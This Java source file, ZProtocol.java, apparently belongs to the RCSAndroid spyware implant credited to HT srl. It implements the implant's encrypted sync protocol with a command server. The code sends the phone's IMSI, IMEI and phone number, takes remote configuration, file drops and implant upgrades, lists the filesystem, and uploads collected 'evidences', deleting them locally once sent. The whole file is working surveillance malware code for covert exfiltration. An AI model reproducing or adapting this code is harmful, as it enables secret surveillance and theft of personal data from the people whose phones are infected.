/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : ZProtocol.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.action.sync;

import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Date;
import java.util.Vector;

import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.crypto.CryptoException;
import com.ht.RCSAndroidGUI.crypto.EncryptionPKCS5;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.crypto.SHA1Digest;
import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Directory;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ZProtocol.
 */
public class ZProtocol extends Protocol {

	/** The debug. */
	private static String TAG = "ZProtocol";
	/** The Constant SHA1LEN. */
	private static final int SHA1LEN = 20;
	/** The crypto k. */
	private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();

	/** The crypto conf. */
	private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();

	/** The Kd. */
	byte[] Kd = new byte[16];

	/** The Nonce. */
	byte[] Nonce = new byte[16];

	/** The upgrade. */
	boolean upgrade;

	/** The upgrade files. */
	Vector upgradeFiles = new Vector();

	/**
	 * Instantiates a new z protocol.
	 */
	public ZProtocol() {
		try {
			random = SecureRandom.getInstance("SHA1PRNG");
		} catch (final NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/** The random. */
	SecureRandom random;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Protocol#perform()
	 */
	@Override
	public boolean perform() {
		Check.requires(transport != null, "perform: transport = null");
		reload = false;
		uninstall = false;

		try {
			transport.start();

			uninstall = authentication();

			if (uninstall) {
				Log.d("QZ", TAG + " Warn: " + "Uninstall detected, no need to continue");
				return true;
			}

			final boolean[] capabilities = identification();

			newConf(capabilities[Proto.NEW_CONF]);
			download(capabilities[Proto.DOWNLOAD]);
			upload(capabilities[Proto.UPLOAD]);
			upgrade(capabilities[Proto.UPGRADE]);
			filesystem(capabilities[Proto.FILESYSTEM]);
			evidences();
			end();

			return true;

		} catch (final TransportException e) {
			Log.d("QZ", TAG + " Error: " + e.toString());
			return false;
		} catch (final ProtocolException e) {
			Log.d("QZ", TAG + " Error: " + e.toString());
			return false;
		} catch (final CommandException e) {
			Log.d("QZ", TAG + " Error: " + e.toString());
			return false;
		} finally {
			transport.close();
		}
	}

	/**
	 * Authentication.
	 * 
	 * @return true if uninstall
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean authentication() throws TransportException, ProtocolException {
		Log.d("QZ", TAG + " Info: ***** Authentication *****");
		// key init
		cryptoConf.makeKey(Keys.self().getChallengeKey());

		random.nextBytes(Kd);
		random.nextBytes(Nonce);
		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());

		final byte[] response = transport.command(cypherOut);

		return parseAuthentication(response);
	}

	/**
	 * Identification.
	 * 
	 * @return the boolean[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean[] identification() throws TransportException, ProtocolException {
		Log.d("QZ", TAG + " Info: ***** Identification *****");
		final byte[] response = command(Proto.ID, forgeIdentification());
		final boolean[] capabilities = parseIdentification(response);
		return capabilities;
	}

	/**
	 * New conf.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void newConf(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			Log.d("QZ", TAG + " Info: ***** NewConf *****");
			final byte[] response = command(Proto.NEW_CONF);
			parseNewConf(response);
		}
	}

	/**
	 * Download.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void download(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			final byte[] response = command(Proto.DOWNLOAD);
			parseDownload(response);
		}
	}

	/**
	 * Upload.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void upload(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			Log.d("QZ", TAG + " Info: ***** Upload *****");
			upgrade = false;
			boolean left = true;
			while (left) {
				final byte[] response = command(Proto.UPLOAD);
				left = parseUpload(response);
			}
		}
	}

	/**
	 * Upgrade.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void upgrade(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			Log.d("QZ", TAG + " Info: ***** Upgrade *****");
			upgradeFiles.removeAllElements();

			boolean left = true;
			while (left) {
				final byte[] response = command(Proto.UPGRADE);
				left = parseUpgrade(response);
			}
		}
	}

	/**
	 * Filesystem.
	 * 
	 * @param cap
	 *            the cap
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void filesystem(final boolean cap) throws TransportException, ProtocolException, CommandException {
		if (cap) {
			Log.d("QZ", TAG + " Info: ***** FileSystem *****");
			final byte[] response = command(Proto.FILESYSTEM);
			parseFileSystem(response);
		}
	}

	/**
	 * Evidences.
	 * 
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void evidences() throws TransportException, ProtocolException, CommandException {
		Log.d("QZ", TAG + " Info: ***** Log *****");
		sendEvidences(Path.logs());
	}

	/**
	 * End.
	 * 
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	private void end() throws TransportException, ProtocolException, CommandException {
		Log.d("QZ", TAG + " Info: ***** END *****");
		final byte[] response = command(Proto.BYE);
		parseNewConf(response);

	}

	// **************** PROTOCOL **************** //
	/**
	 * Forge authentication.
	 * 
	 * @return the byte[]
	 */
	protected byte[] forgeAuthentication() {
		final Keys keys = Keys.self();

		final byte[] data = new byte[104];
		final DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);

		// filling structure
		dataBuffer.write(Kd);
		dataBuffer.write(Nonce);
		Check.ensures(dataBuffer.getPosition() == 32, "forgeAuthentication, wrong array size");
		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
		dataBuffer.write(keys.getInstanceId());
		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
		Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication, wrong array size");
		// calculating digest
		final SHA1Digest digest = new SHA1Digest();
		digest.update(Utils.padByteArray(keys.getBuildId(), 16));
		digest.update(keys.getInstanceId());
		digest.update(Utils.padByteArray(keys.getSubtype(), 16));
		digest.update(keys.getConfKey());

		final byte[] sha1 = digest.getDigest();

		// appending digest
		dataBuffer.write(sha1);
		Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication, wrong array size");
		return data;
	}

	/**
	 * Parses the authentication.
	 * 
	 * @param authResult
	 *            the auth result
	 * @return true if uninstall
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {

		if (new String(authResult).contains("<html>")) {
			Log.d("QZ", TAG + " Error: Fake answer");
			throw new ProtocolException(14);
		}
		Check.ensures(authResult.length == 64, "authResult.length=" + authResult.length);
		// Retrieve K
		final byte[] cypherKs = new byte[32];
		System.arraycopy(authResult, 0, cypherKs, 0, cypherKs.length);
		try {
			final byte[] Ks = cryptoConf.decryptData(cypherKs);
			// PBKDF1 (SHA1, c=1, Salt=KS||Kd)
			final SHA1Digest digest = new SHA1Digest();
			digest.update(Keys.self().getConfKey());
			digest.update(Ks);
			digest.update(Kd);

			final byte[] K = new byte[16];
			System.arraycopy(digest.getDigest(), 0, K, 0, K.length);

			cryptoK.makeKey(K);
			// Retrieve Nonce and Cap
			final byte[] cypherNonceCap = new byte[32];
			System.arraycopy(authResult, 32, cypherNonceCap, 0, cypherNonceCap.length);

			final byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
			final boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
			if (nonceOK) {
				final int cap = Utils.byteArrayToInt(plainNonceCap, 16);
				if (cap == Proto.OK) {
					Log.d("QZ", TAG + " decodeAuth Proto OK");
				} else if (cap == Proto.UNINSTALL) {
					Log.d("QZ", TAG + " decodeAuth Proto Uninstall");
					return true;
				} else {
					Log.d("QZ", TAG + " decodeAuth error: " + cap);
					throw new ProtocolException(11);
				}
			} else {
				throw new ProtocolException(12);
			}

		} catch (final CryptoException ex) {
			Log.d("QZ", TAG + " Error: parseAuthentication: " + ex);
			throw new ProtocolException(13);
		}

		return false;
	}

	/**
	 * Forge identification.
	 * 
	 * @return the byte[]
	 */
	protected byte[] forgeIdentification() {
		final Device device = Device.self();

		final byte[] userid = WChar.pascalize(device.getImsi());
		final byte[] deviceid = WChar.pascalize(device.getImei());
		final byte[] phone = WChar.pascalize(device.getPhoneNumber());

		final int len = 4 + userid.length + deviceid.length + phone.length;

		final byte[] content = new byte[len];

		final DataBuffer dataBuffer = new DataBuffer(content, 0, content.length);
		// dataBuffer.writeInt(Proto.ID);
		dataBuffer.write(device.getVersion());
		dataBuffer.write(userid);
		dataBuffer.write(deviceid);
		dataBuffer.write(phone);
		Check.ensures(dataBuffer.getPosition() == content.length,
				"forgeIdentification pos: " + dataBuffer.getPosition());
		return content;
	}

	/**
	 * Parses the identification.
	 * 
	 * @param result
	 *            the result
	 * @return the boolean[]
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean[] parseIdentification(final byte[] result) throws ProtocolException {
		final boolean[] capabilities = new boolean[Proto.LASTTYPE];

		final int res = Utils.byteArrayToInt(result, 0);

		if (res == Proto.OK) {
			Log.d("QZ", TAG + " Info: got Identification");
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);

			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();

				final long dateServer = dataBuffer.readLong();
				Log.d("QZ", TAG + " parseIdentification: " + dateServer);
				final Date date = new Date();
				final int drift = (int) (dateServer - (date.getTime() / 1000));
				Log.d("QZ", TAG + " parseIdentification drift: " + drift);
				Status.self().drift = drift;

				final int numElem = dataBuffer.readInt();

				for (int i = 0; i < numElem; i++) {
					final int cap = dataBuffer.readInt();
					if (cap < Proto.LASTTYPE) {
						capabilities[cap] = true;
					}
					Log.d("QZ", TAG + " capabilities: " + capabilities[i]);
				}

			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: " + e.toString());
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " Info: no new conf: ");
		} else {
			Log.d("QZ", TAG + " Error: parseNewConf: " + res);
			throw new ProtocolException();
		}

		return capabilities;
	}

	/**
	 * Parses the new conf.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 * @throws CommandException
	 *             the command exception
	 */
	protected void parseNewConf(final byte[] result) throws ProtocolException, CommandException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			
			final int confLen = Utils.byteArrayToInt(result, 4);
			if (confLen > 0) {
				Log.d("QZ", TAG + " Info: got NewConf");
				final boolean ret = Protocol.saveNewConf(result, 8);

				if (ret) {
					reload = true;
				}
			}else{
				Log.d("QZ", TAG + " Error (parseNewConf): empty conf");
			}

		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " Info: no new conf: ");
		} else {
			Log.d("QZ", TAG + " Error: parseNewConf: " + res);
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the download.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseDownload(final byte[] result) throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			Log.d("QZ", TAG + " parseDownload, OK");
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				// la totSize e' discutibile
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					String file = WChar.readPascal(dataBuffer);
					Log.d("QZ", TAG + " parseDownload: " + file);
					// expanding $dir$
					file = Directory.expandMacro(file);
					file = Protocol.normalizeFilename(file);
					Protocol.saveDownloadLog(file);
				}

			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: " + e.toString());
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " Info: parseDownload: no download");
		} else {
			Log.d("QZ", TAG + " Error: parseDownload, wrong answer: " + res);
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upload.
	 * 
	 * @param result
	 *            the result
	 * @return true if left>0
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseUpload(final byte[] result) throws ProtocolException {

		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			Log.d("QZ", TAG + " parseUpload, OK");
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				Log.d("QZ", TAG + " parseUpload left: " + left);
				final String filename = WChar.readPascal(dataBuffer);
				Log.d("QZ", TAG + " parseUpload: " + filename);
				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);
				Log.d("QZ", TAG + " parseUpload: saving");
				Protocol.saveUpload(filename, content);

				return left > 0;

			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: " + e.toString());
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " parseUpload, NO");
			return false;
		} else {
			Log.d("QZ", TAG + " Error: parseUpload, wrong answer: " + res);
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the upgrade.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseUpgrade(final byte[] result) throws ProtocolException {

		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			Log.d("QZ", TAG + " parseUpgrade, OK");
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int left = dataBuffer.readInt();
				Log.d("QZ", TAG + " parseUpgrade left: " + left);
				final String filename = WChar.readPascal(dataBuffer);
				Log.d("QZ", TAG + " parseUpgrade: " + filename);
				final int size = dataBuffer.readInt();
				final byte[] content = new byte[size];
				dataBuffer.read(content);
				Log.d("QZ", TAG + " parseUpgrade: saving");
				Protocol.saveUpload(filename, content);
				upgradeFiles.addElement(filename);

				if (left == 0) {
					Log.d("QZ", TAG + " parseUpgrade: all file saved, proceed with upgrade");
					Protocol.upgradeMulti(upgradeFiles);
				}

				return left > 0;

			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: " + e.toString());
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " parseUpload, NO");
			return false;
		} else {
			Log.d("QZ", TAG + " Error: parseUpload, wrong answer: " + res);
			throw new ProtocolException();
		}
	}

	/**
	 * Parses the file system.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseFileSystem(final byte[] result) throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			Log.d("QZ", TAG + " parseFileSystem, OK");
			final DataBuffer dataBuffer = new DataBuffer(result, 4, result.length - 4);
			try {
				final int totSize = dataBuffer.readInt();
				final int numElem = dataBuffer.readInt();
				for (int i = 0; i < numElem; i++) {
					final int depth = dataBuffer.readInt();
					String file = WChar.readPascal(dataBuffer);
					Log.d("QZ", TAG + " parseFileSystem: " + file + " depth: " + depth);
					// expanding $dir$
					file = Directory.expandMacro(file);
					Protocol.saveFilesystem(depth, file);
				}

			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: parse error: " + e);
				throw new ProtocolException();
			}
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " Info: parseFileSystem: no download");
		} else {
			Log.d("QZ", TAG + " Error: parseFileSystem, wrong answer: " + res);
			throw new ProtocolException();
		}
	}

	/**
	 * Send evidences.
	 * 
	 * @param basePath
	 *            the base path
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void sendEvidences(final String basePath) throws TransportException, ProtocolException {
		Log.d("QZ", TAG + " Info: sendEvidences from: " + basePath);
		final EvidenceCollector logCollector = EvidenceCollector.self();

		final Vector dirs = logCollector.scanForDirLogs(basePath);
		final int dsize = dirs.size();
		Log.d("QZ", TAG + " sendEvidences #directories: " + dsize);
		for (int i = 0; i < dsize; ++i) {
			final String dir = (String) dirs.elementAt(i);
			final String[] logs = logCollector.scanForEvidences(basePath, dir);
			final int lsize = logs.length;
			Log.d("QZ", TAG + "    dir: " + dir + " #evidences: " + lsize);
			// for (int j = 0; j < lsize; ++j) {
			// final String logName = (String) logs.elementAt(j);
			for (final String logName : logs) {
				final String fullLogName = basePath + dir + logName;
				final AutoFile file = new AutoFile(fullLogName);
				if (!file.exists()) {
					Log.d("QZ", TAG + " Error: File doesn't exist: " + fullLogName);
					continue;
				}
				final byte[] content = file.read();
				Log.d("QZ", TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName));
				final byte[] plainOut = new byte[content.length + 4];
				System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
				System.arraycopy(content, 0, plainOut, 4, content.length);

				final byte[] response = command(Proto.LOG, plainOut);
				final boolean ret = parseLog(response);

				if (ret) {
					logCollector.remove(fullLogName);
				} else {
					Log.d("QZ", TAG + " Warn: " + "error sending file, bailing out");
					return;
				}
			}
			if (!Path.removeDirectory(basePath + dir)) {
				Log.d("QZ", TAG + " Warn: " + "Not empty directory");
			}
		}
	}

	/**
	 * Parses the log.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected boolean parseLog(final byte[] result) throws ProtocolException {
		return checkOk(result);
	}

	/**
	 * Parses the end.
	 * 
	 * @param result
	 *            the result
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	protected void parseEnd(final byte[] result) throws ProtocolException {
		checkOk(result);
	}

	// ****************************** INTERNALS ***************************** //
	/**
	 * Command.
	 * 
	 * @param command
	 *            the command
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private byte[] command(final int command) throws TransportException, ProtocolException {
		return command(command, new byte[0]);
	}

	/**
	 * Command.
	 * 
	 * @param command
	 *            the command
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	private byte[] command(final int command, final byte[] data) throws TransportException {
		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
		Check.requires(data != null, "cypherCommand: data null");
		final int dataLen = data.length;
		final byte[] plainOut = new byte[dataLen + 4];
		System.arraycopy(Utils.intToByteArray(command), 0, plainOut, 0, 4);
		System.arraycopy(data, 0, plainOut, 4, data.length);

		try {
			byte[] plainIn;
			plainIn = cypheredWriteReadSha(plainOut);
			return plainIn;
		} catch (final CryptoException e) {
			Log.d("QZ", TAG + " Error: scommand: " + e);
			throw new TransportException(9);
		}
	}

	/**
	 * Cyphered write read.
	 * 
	 * @param plainOut
	 *            the plain out
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws CryptoException
	 *             the crypto exception
	 */
	private byte[] cypheredWriteRead(final byte[] plainOut) throws TransportException, CryptoException {
		final byte[] cypherOut = cryptoK.encryptData(plainOut);
		final byte[] cypherIn = transport.command(cypherOut);
		final byte[] plainIn = cryptoK.decryptData(cypherIn);
		return plainIn;
	}

	/**
	 * Cyphered write read sha.
	 * 
	 * @param plainOut
	 *            the plain out
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 * @throws CryptoException
	 *             the crypto exception
	 */
	private byte[] cypheredWriteReadSha(final byte[] plainOut) throws TransportException, CryptoException {
		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
		final byte[] cypherIn = transport.command(cypherOut);

		if (cypherIn.length < SHA1LEN) {
			Log.d("QZ", TAG + " Error: cypheredWriteReadSha: cypherIn sha len error!");
			throw new CryptoException();
		}

		final byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);

		return plainIn;

	}

	/**
	 * Check ok.
	 * 
	 * @param result
	 *            the result
	 * @return true, if successful
	 * @throws ProtocolException
	 *             the protocol exception
	 */
	private boolean checkOk(final byte[] result) throws ProtocolException {
		final int res = Utils.byteArrayToInt(result, 0);
		if (res == Proto.OK) {
			return true;
		} else if (res == Proto.NO) {
			Log.d("QZ", TAG + " Error: checkOk: NO");
			return false;
		} else {
			Log.d("QZ", TAG + " Error: checkOk: " + res);
			throw new ProtocolException();
		}
	}
}
